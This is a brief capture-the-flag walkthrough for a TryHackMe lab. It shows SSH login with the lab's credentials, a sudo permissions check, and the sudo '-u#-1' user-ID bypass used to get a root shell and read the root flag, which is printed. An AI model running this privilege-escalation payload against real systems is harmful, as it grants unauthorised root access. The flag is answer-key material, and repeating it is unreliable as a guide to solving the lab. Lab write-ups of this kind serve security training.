
# Task 1: (Deploy the machine)

Basics of SSH can be read from manpage.

# Task 2: (Exploitation)

```
export IP=10.10.78.47
```

Username and password = tryhackme

Lets ssh on port 2222

```(ssh)
ssh tryhackme@$IP -p2222
```
Now lets test if we can run sudo command

```
sudo -l
```

This results in saying that we can run /bin/bash with sudo priviledges.
Let's try the sudo vulnerability payload.

```
sudo -u#-1 /bin/bash
```

Bingo. We are greeted with the root shell.

```
cat /root/root.txt
```

Flag:
```
THM{l33t_s3cur1ty_bypass}
```

